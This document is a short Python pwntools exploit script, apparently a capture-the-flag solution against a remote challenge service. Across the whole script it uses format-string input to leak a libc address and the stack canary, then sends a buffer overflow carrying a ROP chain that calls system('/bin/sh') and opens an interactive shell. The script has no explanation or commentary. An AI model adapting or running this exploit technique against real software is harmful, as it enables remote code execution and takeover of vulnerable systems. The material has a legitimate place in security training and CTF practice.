#!/usr/bin/env python3
from pwn import *

exe  = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

io = remote("remote.infoseciitr.in", 8003)

io.send(b"%p|%p")

io.recvuntil(b'0x')  ; _ = int(io.recv(6*2), 16)
io.recvuntil(b'|0x') ; libc.address = int(io.recv(6*2), 16) - 0xb1ba4

io.send(b"%p"*(40//2))

io.recvline() ; io.recvline()
canary = int(io.recvline().split(b'I think you do not need warmup!!')[0].split(b'0x')[1:][8], 16)

rop  = b''
rop += p64(libc.address + 0x14229)
rop += p64(libc.address + 0x142a5)
rop += p64(next(libc.search(b'/bin/sh\x00')))
rop += p64(libc.sym.system)

io.sendline(b'A'*0x18 + p64(canary) + p64(0) + rop)
io.interactive()
